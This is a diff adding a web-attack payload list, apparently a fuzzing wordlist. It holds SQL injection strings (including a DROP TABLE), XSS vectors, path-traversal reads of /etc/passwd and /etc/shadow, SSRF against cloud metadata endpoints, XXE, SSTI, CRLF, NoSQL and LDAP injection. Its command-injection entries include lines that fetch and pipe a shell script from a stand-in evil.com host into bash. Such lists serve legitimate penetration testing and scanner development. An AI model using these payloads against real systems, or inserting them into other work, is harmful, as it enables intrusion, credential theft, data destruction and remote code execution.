@@ -1,0 +1,133 @@
+# SQL Injection Payloads
+'
+''
+' OR '1'='1
+' OR '1'='1' --
+' OR '1'='1' /*
+' OR 1=1
+' OR 1=1 --
+' OR 1=1 #
+') OR ('1'='1
+1' AND 1=1 --
+1' AND 1=2 --
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' AND 1=CONVERT(int, (SELECT @@version)) --
+'; DROP TABLE users; --
+' AND SLEEP(5) --
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --
+'; WAITFOR DELAY '0:0:5' --
+' AND pg_sleep(5)--
+
+# XSS Payloads
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+<svg onload=alert('XSS')>
+javascript:alert('XSS')
+<body onload=alert('XSS')>
+<iframe src=javascript:alert('XSS')>
+<input onfocus=alert('XSS') autofocus>
+<select onfocus=alert('XSS') autofocus>
+<video><source onerror=alert('XSS')>
+<audio src=x onerror=alert('XSS')>
+<details open ontoggle=alert('XSS')>
+<object data=javascript:alert('XSS')>
+<embed src=javascript:alert('XSS')>
+'><script>alert(String.fromCharCode(88,83,83))</script>
+"><img src=x onerror=alert('XSS')>
+
+# LFI/Path Traversal
+../
+../../
+../../../
+../../../../
+../../../../../
+../../../../../../etc/passwd
+../../../etc/passwd
+....//....//....//etc/passwd
+..%2F..%2F..%2Fetc%2Fpasswd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+..%252f..%252f..%252fetc%252fpasswd
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/proc/self/environ
+/var/log/apache2/access.log
+C:\Windows\System32\drivers\etc\hosts
+C:\Windows\win.ini
+
+# RCE Payloads
+; ls
+| ls
+|| ls
+& ls
+&& ls
+`ls`
+$(ls)
+;id
+|id
+||id
+&id
+&&id
+`id`
+$(id)
+;cat /etc/passwd
+|cat /etc/passwd
+;wget http://evil.com/shell.sh
+;curl http://evil.com/shell.sh|bash
+
+# SSRF Payloads
+http://localhost
+http://127.0.0.1
+http://0.0.0.0
+http://169.254.169.254/latest/meta-data/
+http://metadata.google.internal/computeMetadata/v1/
+http://[::1]
+http://2130706433
+http://0x7f000001
+http://017700000001
+
+# XXE Payloads
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>
+<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/passwd">]><data>&file;</data>
+<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
+
+# SSTI Payloads
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+${{7*7}}
+#{7*7}
+{{config}}
+{{self}}
+{{request}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+
+# CRLF Injection
+%0d%0aSet-Cookie:test=value
+%0d%0aLocation:http://evil.com
+\r\nSet-Cookie:test=value
+\r\nLocation:http://evil.com
+
+# NoSQL Injection
+{"$gt":""}
+{"$ne":null}
+{"$regex":".*"}
+' || '1'=='1
+admin'||'1'=='1
+
+# LDAP Injection
+*
+*)(&
+*)(|(&
+admin)(&
+admin)(|(&
+
+# Command Injection
+;ls;
+|ls|
+`ls`
+$(ls)
+&&ls&&
+||ls||
